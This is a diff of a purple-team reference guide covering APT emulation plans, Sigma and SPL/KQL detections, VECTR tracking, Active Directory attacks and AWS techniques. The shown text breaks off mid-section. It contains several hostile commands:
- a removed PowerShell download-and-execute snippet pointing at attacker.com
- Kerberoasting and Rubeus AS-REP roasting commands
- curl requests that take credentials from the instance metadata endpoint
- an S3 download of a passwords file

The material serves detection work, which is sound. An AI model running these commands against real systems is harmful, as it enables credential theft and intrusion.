-    runs-on: ubuntu-latest
-    environment: production
-    steps:
-      - name: Deploy to Splunk Production
-        env:
-          SPLUNK_URL: ${{ secrets.SPLUNK_PROD_URL }}
-          SPLUNK_TOKEN: ${{ secrets.SPLUNK_PROD_TOKEN }}
-        run: python scripts/deploy_to_splunk.py --env production
-```
-
-### Detection Coverage Metrics Tracking
-
-```python
-import json, datetime
-from pathlib import Path
-
-RULES_DIR = Path("rules/")
-COVERAGE_FILE = Path("coverage/coverage_history.jsonl")
-
-def count_coverage(rules_dir):
-    # Count ATT&CK technique coverage from Sigma rules.
-    techniques = set()
-    for rule_file in rules_dir.rglob("*.yml"):
-        import yaml
-        with open(rule_file) as f:
-            rule = yaml.safe_load(f)
-        for tag in rule.get("tags", []):
-            if tag.startswith("attack.t"):
-                tid = tag.replace("attack.", "").upper()
-                techniques.add(tid)
-    return techniques
-
-covered = count_coverage(RULES_DIR)
-snapshot = {
-    "date": datetime.date.today().isoformat(),
-    "technique_count": len(covered),
-    "techniques": sorted(covered)
-}
-
-with open(COVERAGE_FILE, "a") as f:
-    f.write(json.dumps(snapshot) + "\n")
-
-print(f"ATT&CK technique coverage: {len(covered)} techniques")
+Purple Team Test (Not Detected)
+        │
+        ▼
+Create Jira/GitHub Issue:
+  - Technique: T1558.003
+  - Gap type: "Log present, no rule"
+  - Available data: Windows Event 4769 in index=windows
+  - Priority: High (active threat actor uses this)
+        │
+        ▼
+Detection Engineer writes Sigma rule:
+title: Kerberoasting RC4 TGS Request
+id: 4a4e5f6a-...
+status: experimental
+description: Detects possible Kerberoasting via RC4 TGS ticket requests
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4769
+        TicketEncryptionType: '0x17'
+        TicketOptions: '0x40810000'
+    filter_computer:
+        AccountName|endswith: '$'
+    condition: selection and not filter_computer
+falsepositives:
+    - Legacy applications using RC4 Kerberos
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1558.003
+        │
+        ▼
+Convert Sigma to SIEM-native query (sigma-cli)
+        │
+        ▼
+Deploy to SIEM → Re-run purple team test → Verify → Close issue
 ```
 
 ---
+## 6. Threat Intelligence-Driven Purple Teaming
 
-## 10. VECTR — Purple Team Tracking
+### 6.1 Threat Actor Identification
 
-### Overview
+Effective purple teaming starts with knowing which adversaries most plausibly threaten your organization.
 
-**VECTR** (Vulnerability and Exploitation Tracking and Reporting) is a free, open-source
-platform for tracking purple team test campaigns.
+**Identification criteria:**
 
-- **Repository:** https://github.com/SecurityRiskAdvisors/VECTR
-- **Hosted:** SRA VECTR Cloud (free tier available)
+| Criterion | Questions |
+|---|---|
+| **Industry targeting** | Which threat groups historically target your sector (Finance, Healthcare, Energy, Tech)? |
+| **Geographic focus** | Do threat actors target organizations in your region or country? |
+| **Crown jewel alignment** | Do the actor's collection objectives align with your most sensitive data? |
+| **Capability match** | Does the actor's sophistication level reflect your real-world threat? |
 
-### Key Capabilities
+**Primary intelligence sources:**
+- **Mandiant M-Trends** — Annual threat report with industry-specific TTPs
+- **CrowdStrike Adversary Intelligence** — Named adversary profiles with ATT&CK mappings
+- **Recorded Future** — Structured threat intelligence with ATT&CK integration
+- **CISA Advisories** — Free government advisories for nation-state and criminal groups
+- **ISAC reports** — Sector-specific threat intelligence sharing
+- **ATT&CK Groups page** — https://attack.mitre.org/groups/ — Free ATT&CK mappings for known groups
 
-- Track test campaigns by ATT&CK technique across exercises
-- Record outcomes: Detected / Prevented / Missed / Partial
-- Store evidence: log snippets, screenshots, detection rule links
-- Generate ATT&CK Navigator layers from exercise results
-- Track detection coverage improvement over time
-- Export reports for executive briefings
+### 6.2 APT Emulation Plans
 
-### VECTR Campaign Structure
+**MITRE ATT&CK Emulation Plans (free, open-source):**
+
+| Plan | Threat Actor | Focus |
+|---|---|---|
+| APT29 | Russian SVR / Cozy Bear | Espionage, credential theft, C2 |
+| FIN6 | Financially motivated | POS malware, Cobalt Strike |
+| menuPass | Chinese APT10 | Managed service provider targeting |
+
+Available at: https://github.com/center-for-threat-informed-defense/adversary_emulation_library
+
+**CTID emulation plan structure:**
+1. **Intelligence Summary** — Actor background, targeting, objectives
+2. **Operations Flow** — High-level attack narrative
+3. **Phase breakdown** — Per-phase techniques with procedure examples
+4. **ATT&CK technique list** — All mapped technique IDs
+5. **Detection opportunities** — Expected log sources and events per technique
+6. **Emulation execution steps** — Command-level procedures
+
+**Mapping actor procedures to atomic tests:**
+```
+APT29 Procedure: Use PowerShell to download and execute remote payload
+  → ATT&CK: T1059.001 (PowerShell) + T1105 (Ingress Tool Transfer)
+  → Atomic: Invoke-AtomicTest T1059.001 -TestNumbers 2
+             Invoke-AtomicTest T1105 -TestNumbers 1
+
+APT29 Procedure: Steal credentials from LSASS
+  → ATT&CK: T1003.001 (LSASS Memory)
+  → Atomic: Invoke-AtomicTest T1003.001 -TestNumbers 1
+
+APT29 Procedure: Kerberoast service accounts
+  → ATT&CK: T1558.003
+  → Atomic: Invoke-AtomicTest T1558.003 -TestNumbers 1
+```
+
+### 6.3 Intelligence-Based Scenario Design
+
+**Scenario template — APT29 Initial Compromise to Credential Theft:**
 
 ```
-Campaign: Q1 2024 Purple Team — APT29 Emulation
-  └─ Assessment: Initial Access Phase
-       ├─ Test Case: T1566.001 — Spear-phishing attachment
-       │    ├─ Outcome: Detected
-       │    ├─ Detection: Email gateway blocked + SIEM alert fired
-       │    └─ Evidence: [Screenshot of alert]
-       │
-       ├─ Test Case: T1190 — Exploit public-facing app
-       │    ├─ Outcome: Missed
-       │    ├─ Root cause: WAF bypassed via encoding; no SIEM rule for web shell
-       │    └─ Remediation: [Ticket #1234]
-       │
-  └─ Assessment: Execution Phase
-       ├─ Test Case: T1059.001 — PowerShell
-       │    ├─ Outcome: Detected
-       │    └─ Detection: PowerShell block logging + Splunk alert
-       │
+SCENARIO: APT29-Inspired Credential Access Campaign
+
+OBJECTIVE: Validate detection of Russian SVR-style credential theft following
+           phishing-based initial access
+
+THREAT ACTOR: APT29 (Cozy Bear) — Russian SVR, active against government,
+              think tanks, healthcare, and tech sectors
+
+PHASE 1 — INITIAL ACCESS
+  Technique: T1566.001 Spearphishing Attachment
+  Simulation: Deliver weaponized Office document to test mailbox
+  Atomic: Manual delivery to sandboxed endpoint
+  Detection expected: Email gateway block + EDR macro alert
+
+PHASE 2 — EXECUTION
+  Technique: T1059.001 PowerShell
+  Simulation: PowerShell download cradle from C2 simulation server
+  Atomic: Invoke-AtomicTest T1059.001 -TestNumbers 2
+  Detection expected: PowerShell Script Block Logging Event 4104
+
+PHASE 3 — PERSISTENCE
+  Technique: T1547.001 Registry Run Key
+  Atomic: Invoke-AtomicTest T1547.001 -TestNumbers 1
+  Detection expected: Sysmon Event 13 registry value set
+
+PHASE 4 — CREDENTIAL ACCESS
+  Technique: T1003.001 LSASS Memory
+  Atomic: Invoke-AtomicTest T1003.001 -TestNumbers 1
+  Detection expected: Sysmon Event 10 LSASS access + EDR alert
+
+PHASE 5 — LATERAL MOVEMENT
+  Technique: T1550.002 Pass the Hash
+  Atomic: Invoke-AtomicTest T1550.002 -TestNumbers 1
+  Detection expected: Event 4624 (Logon Type 3, NTLM) + Event 4648
+
+PHASE 6 — COLLECTION / EXFILTRATION
+  Technique: T1074.001 Local Data Staging + T1048 Exfiltration Alt Protocol
+  Atomic: Invoke-AtomicTest T1074.001; Invoke-AtomicTest T1048
+  Detection expected: Large file creation + outbound DNS/ICMP anomaly
 ```
 
-### VECTR REST API
+### 6.4 After-Action Threat Intelligence Updates
 
+Purple team results should feed back into the threat intelligence function:
+
+**Update threat model based on detection gaps:**
+- If T1003.001 (LSASS dump) is undetected → elevate risk rating for credential-theft-capable actors
+- If T1558.003 (Kerberoasting) is undetected → flag all APT groups known to use Kerberoasting as elevated risk
+
+**Adjust defensive priorities based on TTP overlap with gaps:**
+```
+TTP overlap analysis:
+  Undetected techniques: T1003.001, T1558.003, T1550.002
+  Threat actors using ALL THREE: APT28, APT29, Sandworm, HAFNIUM
+  Business impact of those actors: Critical
+  Action: Escalate detection engineering priority for these three techniques
+           to P1; brief CISO on gap-actor correlation
+```
+
+**Intelligence sharing output:** After a purple team exercise, publish an internal threat intelligence update summarizing:
+- Which tested techniques were not detected
+- Which threat actors use those techniques
+- Recommended defensive actions (log source gaps, rule creation)
+- Timeline for remediation
+
+---
+## 7. Purple Team Tools & Automation
+
+### 7.1 Vectr — Comprehensive Platform Guide
+
+Vectr (https://vectr.io) is the recommended purple team management platform for tracking tests, results, and coverage across campaigns.
+
+**Hierarchy structure:**
+```
+Organization
+  └── Project (e.g., "FY2025 Purple Team Program")
+        └── Campaign (e.g., "Q1 2025 — APT29 Emulation")
+              └── Assessment (e.g., "Credential Access Techniques")
+                    └── Test Cases (individual ATT&CK technique tests)
+```
+
+**Test case creation fields:**
+- Name (e.g., "T1558.003 — Kerberoasting via Rubeus")
+- ATT&CK technique mapping (tactic + technique ID)
+- Description / procedure documentation
+- Operator (who ran the test)
+- Test date
+- Outcome: Detected / Not Detected / Partial
+- Detection quality rating (1–5)
+- Evidence attachment (screenshots, SIEM alert exports, logs)
+- Remediation status and assigned engineer
+
+**Executive dashboard metrics:**
+- Overall detection rate (%)
+- Techniques tested vs. total ATT&CK techniques
+- Coverage by tactic (radar/spider chart)
+- Trend over time (quarter-over-quarter improvement)
+- Open remediation items by priority
+
+**REST API for programmatic management:**
 ```python
 import requests
 
-VECTR_URL = "https://vectr.corp.local"
-API_KEY = "your-api-key"
-HEADERS = {"Authorization": f"ApiKey {API_KEY}", "Content-Type": "application/json"}
+VECTR_URL = "https://vectr.example.com"
+TOKEN = "your-vectr-api-token"
 
-# Create a new campaign
-campaign = requests.post(f"{VECTR_URL}/sra-purpletools-rest/rest/v1/campaigns",
-    headers=HEADERS,
-    json={
-        "name": "Q1 2024 APT29 Emulation",
-        "description": "Purple team exercise emulating APT29 TTPs",
-        "db": "default"
-    }
-).json()
+headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
 
-# Add a test case
-test_case = requests.post(f"{VECTR_URL}/sra-purpletools-rest/rest/v1/testcases",
-    headers=HEADERS,
-    json={
-        "campaignId": campaign["id"],
-        "name": "T1059.001 - PowerShell Encoded Command",
-        "phase": "Execution",
-        "attackTechniqueId": "T1059.001",
-        "outcome": "DETECTED",
-        "outcomeNotes": "PowerShell block logging + Splunk rule PS_EncodedCommand fired within 45 seconds",
-        "detectionSteps": "Search index=windows EventCode=4104 ScriptBlockText=*encodedcommand*"
-    }
-).json()
+# Create a test case
+test_case = {
+    "name": "T1558.003 Kerberoasting",
+    "attackTechnique": "T1558.003",
+    "tactic": "credential-access",
+    "outcome": "not_detected",
+    "operatorNotes": "No SIEM alert. Event 4769 with 0x17 encryption type present in raw logs but no rule.",
+    "remediationStatus": "open",
+    "priority": "high"
+}
 
-print(f"Test case created: {test_case['id']}")
+r = requests.post(f"{VECTR_URL}/api/v1/testcases", headers=headers, json=test_case)
+print(r.status_code, r.json()["id"])
 ```
 
----
+### 7.2 ATT&CK Workbench
 
-## 11. Adversary Emulation Plans
+ATT&CK Workbench (https://github.com/center-for-threat-informed-defense/attack-workbench-frontend) is a self-hosted knowledge base for managing a custom ATT&CK instance.
 
-### MITRE CTID Adversary Emulation Library
+**Use cases for purple teams:**
+- **Custom techniques** — Add internal techniques not in the public ATT&CK knowledge base (e.g., techniques targeting proprietary systems)
+- **Custom groups** — Track internally-identified threat actors with ATT&CK mappings
+- **Procedure tracking** — Link observed procedures from your threat intel to standard techniques
+- **Internal ATT&CK versioning** — Pin your team to a specific ATT&CK version while evaluating upgrades
 
-The Center for Threat-Informed Defense (CTID) publishes detailed adversary emulation
-plans that map real threat actor behaviors to step-by-step commands:
-
-**Repository:** https://github.com/center-for-threat-informed-defense/adversary_emulation_library
-
-### APT29 (Cozy Bear) Emulation Plan
-
-**Threat actor:** SVR (Russian Foreign Intelligence Service)
-**Known attacks:** SolarWinds/SUNBURST, Democratic National Committee breach
-
-| Phase | Technique | Tool | Detection Opportunity |
-|-------|-----------|------|----------------------|
-| Initial Access | T1566.001 | Spear-phishing with malicious link | Email gateway URL detonation |
-| Execution | T1059.001 | PowerShell download cradle | PS block logging, EventID 4104 |
-| Persistence | T1053.005 | Scheduled task | EventID 4698 |
-| Defense Evasion | T1562.001 | Disable Windows Defender | EventID 7036 (service stop) |
-| Credential Access | T1003.001 | LSASS dump (comsvcs.dll) | Process access to lsass.exe |
-| Lateral Movement | T1021.002 | SMB lateral via WMI | EventID 4624 type 3, WMI activity |
-| Collection | T1074.001 | Local data staging | Mass file access in short window |
-| Exfiltration | T1048.003 | DNS tunnel exfil | Unusual DNS query volume/entropy |
-
-### FIN6 (Carbanak / FIN7) Emulation Plan
-
-**Threat actor:** Financially motivated, targets POS systems and hospitality
-**Known attacks:** Restaurant chain POS breaches, Delta Airlines, Saks Fifth Avenue
-
-| Phase | Technique | Description |
-|-------|-----------|-------------|
-| Initial Access | T1566.001 | Spear-phishing with MORE_EGGS backdoor |
-| Execution | T1059.001 | PowerShell payload delivery |
-| Persistence | T1543.003 | Windows service creation |
-| Lateral Movement | T1021.002 | PsExec lateral movement |
-| Collection | T1005 | POS data harvesting |
-| Exfiltration | T1041 | Exfil to attacker-controlled server |
-
-### menuPass (APT10) Emulation Plan
-
-**Threat actor:** Chinese APT targeting MSPs and defense contractors
-**Known attacks:** Operation Cloud Hopper (MSP compromise chain)
-
-| Phase | Technique | Tool |
-|-------|-----------|------|
-| Initial Access | T1566.001 | Spear-phishing, watering hole |
-| Execution | T1059.001 | PowerShell, PlugX loader |
-| Persistence | T1547.001 | Registry Run keys |
-| C2 | T1071.001 | HTTP C2 via PlugX/QuasarRAT |
-| Lateral Movement | T1021.006 | WinRM lateral |
-| Exfiltration | T1048.002 | FTP exfiltration |
-
-### Sandworm (GRU Unit 74455) Emulation Plan
-
-**Threat actor:** Russian GRU, destructive attacks on critical infrastructure
-**Known attacks:** NotPetya, Ukrainian power grid, Olympic Destroyer
-
-| Phase | Technique | Description |
-|-------|-----------|-------------|
-| Initial Access | T1190 | Exploit public-facing applications |
-| Execution | T1059.001 | PowerShell execution |
-| Impact | T1485 | Data destruction |
-| Impact | T1486 | Ransomware-style encryption |
-| Impact | T1529 | System shutdown/reboot |
-| ICS | T0831 | Manipulation of control systems |
-
-### Custom Emulation Plan Template
-
-```markdown
-## Custom Emulation Plan: [Threat Actor Name]
-
-### Threat Actor Profile
-- **Name:** [Actor name]
-- **Attribution:** [Country/Group]
-- **Motivation:** [Financial / Espionage / Destructive]
-- **Target sectors:** [Finance / Healthcare / Government / etc.]
-- **Key TTPs:** [Top 5-10 ATT&CK techniques]
-
-### Emulation Steps
-
-#### Phase 1: Initial Access
-**Technique:** T1566.001 — Spear-phishing Attachment
-**Tool:** Custom macro document
-**Command:**
-```powershell
-# Macro drops and executes payload
-$url = "https://attacker.com/beacon.exe"
-$out = "$env:TEMP\update.exe"
-(New-Object Net.WebClient).DownloadFile($url, $out)
-Start-Process $out
-```
-**Detection opportunity:** Email gateway, PowerShell logging, process creation
-
-#### Phase 2: Execution
-...
-```
-
----
-
-## 12. Key Resources
-
-### Purple Team Platforms and Frameworks
-
-| Resource | URL | Purpose |
-|----------|-----|---------|
-| **ATT&CK Navigator** | https://mitre-attack.github.io/attack-navigator/ | Coverage visualization |
-| **Atomic Red Team** | https://github.com/redcanaryco/atomic-red-team | Individual technique tests |
-| **CALDERA** | https://github.com/mitre/caldera | Adversary emulation platform |
-| **VECTR** | https://github.com/SecurityRiskAdvisors/VECTR | Purple team tracking |
-| **Sigma** | https://github.com/SigmaHQ/sigma | Generic detection rules |
-| **D3FEND** | https://d3fend.mitre.org | Defensive countermeasure mapping |
-| **CTID Emulation Library** | https://github.com/center-for-threat-informed-defense/adversary_emulation_library | Adversary emulation plans |
-| **ATT&CK for ICS** | https://attack.mitre.org/matrices/ics/ | ICS/OT ATT&CK matrix |
-| **MITRE ATT&CK CTI** | https://github.com/mitre/cti | ATT&CK STIX data |
-
-### Detection Engineering Resources
-
-| Resource | URL | Purpose |
-|----------|-----|---------|
-| **pySigma** | https://github.com/SigmaHQ/pySigma | Sigma conversion library |
-| **Sigma-cli** | https://github.com/SigmaHQ/sigma-cli | Command-line Sigma converter |
-| **Florian Roth's Blog** | https://cyb3rops.medium.com | Detection engineering insights |
-| **Red Canary Blog** | https://redcanary.com/blog/ | Annual ATT&CK-mapped threat report |
-| **ATT&CK Evaluations** | https://attackevals.mitre-engenuity.org | EDR/SIEM detection benchmarks |
-| **Detection Engineering Weekly** | https://detectionengineering.net | Newsletter on detection engineering |
-
-### Purple Team Learning Resources
-
-| Resource | Type | Focus |
-|----------|------|-------|
-| **Purple Team Exercise Framework (PTEF)** | Guide | Structured exercise methodology |
-| **SCYTHE Community Threats** | GitHub | Threat emulation content |
-| **ATT&CK Purple Teaming** | MITRE docs | Official ATT&CK purple team guidance |
-| **Red Canary Threat Detection Report** | Annual report | Real-world ATT&CK-mapped detections |
-| **Specter Ops Blog** | Blog | Adversary simulation tradecraft |
-| **SANS Detection Engineering** | Course | FOR508, FOR572, FOR610 |
-
-### Tooling Quick Reference
-
+**Deployment:**
 ```bash
-# Atomic Red Team — List and run tests
-Install-Module invoke-atomicredteam -Scope CurrentUser -Force
-Invoke-AtomicTest T1059.001 -ShowDetailsBrief
-Invoke-AtomicTest T1059.001 -TestNumbers 1
-
-# CALDERA — Start server
-git clone https://github.com/mitre/caldera.git --recursive
-cd caldera && python3 server.py --insecure
-# Access: http://localhost:8888
-
-# Sigma — Convert rules
-pip install sigma-cli pySigma-backend-splunk
-sigma convert -t splunk -p splunk_windows rules/windows/
-
-# Stratus Red Team (Cloud)
-brew install datadog/stratus-red-team/stratus-red-team
-stratus list
-stratus detonate aws.execution.ec2-user-data
-
-# VECTR — Docker deployment
+# Clone and start via Docker Compose
+git clone https://github.com/center-for-threat-informed-defense/attack-workbench-frontend
+cd attack-workbench-frontend
 docker-compose up -d
-# Access: https://localhost:8443
+# Access at http://localhost
+```
+
+### 7.3 ATT&CK Flow
+
+ATT&CK Flow (https://github.com/center-for-threat-informed-defense/attack-flow) is an open language and tool for describing sequences of adversary behaviors (multi-step attack scenarios).
+
+**Attack Flow JSON format:**
+```json
+{
+  "type": "bundle",
+  "id": "bundle--...",
+  "spec_version": "2.0",
+  "objects": [
+    {
+      "type": "attack-flow",
+      "id": "attack-flow--...",
+      "name": "APT29 Credential Theft Chain",
+      "description": "PowerShell download → LSASS dump → Pass the Hash"
+    },
+    {
+      "type": "attack-action",
+      "id": "attack-action--1",
+      "technique_id": "T1059.001",
+      "name": "PowerShell Download Cradle"
+    },
+    {
+      "type": "attack-action",
+      "id": "attack-action--2",
+      "technique_id": "T1003.001",
+      "name": "LSASS Memory Dump"
+    }
+  ]
+}
+```
+
+**ATT&CK Flow Builder GUI:** Visual drag-and-drop interface at https://center-for-threat-informed-defense.github.io/attack-flow/ui/
+
+### 7.4 TRAM — Threat Report ATT&CK Mapper
+
+TRAM (https://github.com/center-for-threat-informed-defense/tram) uses machine learning to automatically extract ATT&CK technique mappings from threat intelligence reports.
+
+**Workflow:** Upload threat report PDF/URL → TRAM extracts sentences mentioning techniques → Human validates suggestions → Export ATT&CK technique list for purple team test planning.
+
+### 7.5 EDR Telemetry Assessment Tools
+
+**PurpleSharp** (https://github.com/mvelazc0/PurpleSharp):
+- Designed for Active Directory-joined Windows environments
+- Simulates adversary behaviors directly in the domain context
+- Generates realistic Windows Security events (logon events, process creation, network connections)
+- Useful for validating detection in complex enterprise AD scenarios
+
+**AtomicTestHarnesses** (https://github.com/redcanaryco/AtomicTestHarnesses):
+- PowerShell module providing test harnesses for complex Windows behaviors
+- Supplements Atomic Red Team for techniques requiring precise Windows API calls
+
+**Prelude Operator** (https://www.prelude.org/):
+- Commercial platform with automated detection validation
+- Agent-based, maps to ATT&CK, supports custom TTP libraries
+
+### 7.6 Automated Purple Team Pipelines
+
+**CI/CD pipeline for continuous detection validation:**
+
+```yaml
+# .github/workflows/purple-team-validation.yml
+name: Daily Purple Team Atomic Validation
+
+on:
+  schedule:
+    - cron: '0 2 * * *'   # Run at 02:00 UTC daily
+  workflow_dispatch:
+
+jobs:
+  atomic-validation:
+    runs-on: [self-hosted, purple-team-endpoint]
+    steps:
+      - name: Run Atomic Tests — Credential Access
+        shell: powershell
+        run: |
+          Import-Module invoke-atomicredteam
+          $techniques = @("T1558.003","T1003.001","T1110.001")
+          foreach ($t in $techniques) {
+            Invoke-AtomicTest $t -GetPrereqs -ErrorAction SilentlyContinue
+            Invoke-AtomicTest $t
+            Start-Sleep -Seconds 300   # Wait for SIEM ingestion
+            Invoke-AtomicTest $t -Cleanup
+          }
+
+      - name: Validate Detections via SIEM API
+        env:
+          SPLUNK_TOKEN: ${{ secrets.SPLUNK_TOKEN }}
+        shell: python3 {0}
+        run: |
+          import requests, json
+          from datetime import datetime, timedelta
+
+          techniques = {
+            "T1558.003": 'index=windows EventCode=4769 TicketEncryptionType=0x17',
+            "T1003.001": 'index=windows EventCode=10 TargetImage="*lsass.exe"',
+            "T1110.001": 'index=windows EventCode=4625 LogonType=3'
+          }
+
+          results = {}
+          for technique, query in techniques.items():
+            r = requests.post("https://splunk.internal:8089/services/search/jobs/export",
+              auth=("admin", "${{ secrets.SPLUNK_TOKEN }}"),
+              data={"search": f"search {query} earliest=-10m", "output_mode": "json"})
+            results[technique] = "DETECTED" if r.text.strip() else "NOT DETECTED"
+
+          print(json.dumps(results, indent=2))
+
+          # Fail pipeline if regression detected
+          regressions = [t for t, r in results.items() if r == "NOT DETECTED"]
+          if regressions:
+            raise SystemExit(f"REGRESSION: {regressions} not detected!")
 ```
 
 ---
+## 8. Active Directory Purple Teaming
 
-*Last updated: 2024 | Part of the [TeamStarWolf](https://github.com/TeamStarWolf/TeamStarWolf) cybersecurity reference library.*
+### 8.1 Core AD Attack Techniques and Detection Events
+
+#### T1558.003 — Kerberoasting
+
+**Attack:** Enumerate accounts with Service Principal Names (SPNs) and request TGS tickets, then crack offline.
+
+**Execution:**
+```powershell
+# Enumerate SPN accounts
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
+  Select-Object Name, ServicePrincipalName
+
+# Request TGS tickets (triggers Event 4769)
+Add-Type -AssemblyName System.IdentityModel
+$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Select-Object -ExpandProperty UserPrincipalName
+$spns | ForEach-Object {
+  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_
+}
+```
+
+**Detection — Windows Security Event 4769:**
+```
+EventID: 4769 (A Kerberos service ticket was requested)
+TicketEncryptionType: 0x17 (RC4 — weak, crackable offline)
+TicketOptions: 0x40810000
+ServiceName: NOT ending in $ (user account, not computer account)
+```
+
+**SPL query:**
+```spl
+index=windows EventCode=4769 TicketEncryptionType=0x17
+  [| inputlookup service_accounts | fields AccountName]
+| stats count by AccountName, ServiceName, src_ip
+| where count > 3
+```
+
+#### T1558.004 — AS-REP Roasting
+
+**Attack:** Request AS-REP for accounts with Kerberos pre-authentication disabled. No credentials required.
+
+**Execution:**
+```powershell
+# Find accounts without pre-auth
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+
+# Using Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+```
+
+**Detection — Windows Security Event 4768:**
+```
+EventID: 4768 (A Kerberos authentication ticket was requested)
+PreAuthType: 0 (No pre-authentication)
+AccountName: NOT ending in $ (user account)
+```
+
+#### T1003.001 — LSASS Memory Dump
+
+**Attack:** Dump LSASS process memory to extract plaintext credentials or NTLM hashes.
+
+**Detection events:**
+- **Sysmon Event 10** (ProcessAccess): TargetImage = `C:\Windows\System32\lsass.exe`, GrantedAccess = `0x1010` or `0x1410`
+- **Windows Security Event 4656**: Object Handle Requested for LSASS
+
+**KQL (Microsoft Sentinel):**
+```kql
+SecurityEvent
+| where EventID == 4656
+| where ObjectName contains "lsass"
+| where AccessMask in ("0x1010", "0x1410", "0x143a")
+| project TimeGenerated, Computer, SubjectUserName, ProcessName, ObjectName, AccessMask
+```
+
+#### T1550.002 — Pass the Hash
+
+**Attack:** Authenticate using stolen NTLM hash without knowing the plaintext password.
+
+**Detection — combined event correlation:**
+```
+Event 4624 (Successful Logon):
+  LogonType: 3 (Network)
+  AuthenticationPackageName: NTLM
+  WorkstationName: [suspicious workstation]
+
+Event 4648 (Logon using explicit credentials):
+  Correlate with above for double logon anomaly
+```
+
+**SPL query:**
+```spl
+index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
+| stats dc(Computer) as hop_count by src_user, src_ip
+| where hop_count > 3
+| sort -hop_count
+```
+
+#### T1484.001 — GPO Modification
+
+**Attack:** Modify Group Policy Objects to execute malicious code across domain systems.
+
+**Detection — Windows Security Event 5136:**
+```
+EventID: 5136 (A directory service object was modified)
+ObjectClass: groupPolicyContainer
+AttributeValue: Modified
+```
+
+#### T1207 — DCShadow
+
+**Attack:** Register a rogue domain controller to push malicious replication changes without standard DC audit logs.
+
+**Detection:** Look for new domain controller registration events — unusual `nTDSDSA` object creation in the Configuration partition, unexpected replication partner announcements.
+
+### 8.2 BloodHound for Purple Team Attack Path Planning
+
+BloodHound (https://github.com/BloodHoundAD/BloodHound) visualizes Active Directory attack paths and is invaluable for purple team planning.
+
+**Purple team workflow with BloodHound:**
+
+**Step 1 — SharpHound collection:**
+```powershell
+# Run SharpHound collector on domain-joined system
+.\SharpHound.exe -c All --zipfilename purpleteam_collection.zip
+# Or with specific collection methods
+.\SharpHound.exe -c DCOnly,Session,ACL,ObjectProps --domain CORP.LOCAL
+```
+
+**Step 2 — BloodHound analysis:**
+```cypher
+-- Find all paths from any owned user to Domain Admins
+MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
+RETURN p
+
+-- Find Kerberoastable accounts with paths to DA
+MATCH (u:User {hasspn:true})
+MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
+RETURN u.name, length(p) as hops
+ORDER BY hops ASC LIMIT 20
+```
+
+**Step 3 — Select edges for detection testing:**
+Each BloodHound edge type maps to ATT&CK techniques:
+
+| BloodHound Edge | ATT&CK Technique | Test |
+|---|---|---|
+| HasSession | T1558.003 Kerberoasting | Invoke-AtomicTest T1558.003 |
+| AdminTo | T1021.002 SMB/Windows Admin Shares | Invoke-AtomicTest T1021.002 |
+| DCSync | T1003.006 DCSync | Invoke-AtomicTest T1003.006 |
+| WriteDacl | T1222 File/Directory Permissions | Invoke-AtomicTest T1222 |
+| GenericAll | T1484 Domain Policy Modification | Invoke-AtomicTest T1484.001 |
+
+### 8.3 DCSync Detection
+
+**Attack:** Use domain replication rights to pull password hashes from a Domain Controller without running code on the DC.
+
+**Splunk detection query:**
+```spl
+index=windows EventCode=4662
+  ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
+  AccessMask=0x100
+  AccountName!=*$
+| table _time, AccountName, Computer, ObjectName, AccessMask
+| sort -_time
+```
+
+### 8.4 Golden Ticket Detection
+
+**Attack:** Forge a Kerberos TGT using the KRBTGT hash, granting unlimited domain access.
+
+**Detection signals:**
+- Kerberos tickets with unusually long lifetimes (>10 hours default)
+- TGT presented without corresponding AS-REQ (ticket sourced offline)
+- Account SID mismatch between ticket and AD object
+
+**KQL:**
+```kql
+SecurityEvent
+| where EventID == 4769
+| where TicketOptions == "0x40810010"
+| where TargetUserName !endswith "$"
+| where IPAddress !in (known_dc_ips)
+| project TimeGenerated, TargetUserName, ServiceName, IPAddress, TicketEncryptionType
+```
+
+---
+## 9. Cloud Purple Teaming
+
+### 9.1 AWS Techniques and Detection
+
+#### IAM Enumeration (T1087.004, T1069.003)
+
+**Attack — enumerate IAM permissions:**
+```bash
+# Enumerate all IAM users
+aws iam list-users --output json
+
+# Enumerate all IAM roles
+aws iam list-roles --output json
+
+# Get full account authorization details (all policies, users, roles, groups)
+aws iam get-account-authorization-details --output json > iam_dump.json
+```
+
+**Detection in CloudTrail:**
+```json
+{
+  "eventSource": "iam.amazonaws.com",
+  "eventName": "ListUsers",
+  "userIdentity": {
+    "type": "IAMUser",
+    "userName": "suspicious-user"
+  }
+}
+```
+
+**Splunk query for IAM enumeration burst:**
+```spl
+index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com
+  eventName IN ("ListUsers","ListRoles","GetAccountAuthorizationDetails","ListPolicies")
+| stats count by userIdentity.userName, sourceIPAddress
+| where count > 10
+| sort -count
+```
+
+#### EC2 Instance Metadata Service (IMDS) Credential Theft (T1552.005)
+
+**Attack — steal instance credentials from IMDS:**
+```bash
+# IMDSv1 (no authentication required — vulnerable)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
+
+# With Stratus Red Team
+stratus-red-team detonate aws.credential-access.ec2-steal-instance-credentials
+```
+
+**Detection:** VPC Flow Logs showing internal traffic to 169.254.169.254 from unexpected sources, CloudTrail events using credentials with `ec2-instance-connect` source.
+
+**Mitigation:** Enforce IMDSv2 (requires session token, prevents SSRF-based theft):
+```bash
+aws ec2 modify-instance-metadata-options   --instance-id i-1234567890   --http-tokens required   --http-put-response-hop-limit 1
+```
+
+#### S3 Sensitive Data Access (T1530)
+
+**Attack — access sensitive S3 buckets:**
+```bash
+# List bucket contents
+aws s3 ls s3://corp-sensitive-bucket/ --recursive
+
+# Download sensitive files
+aws s3 cp s3://corp-sensitive-bucket/passwords.xlsx ./
+
+# Stratus Red Team — backdoor bucket policy for exfiltration
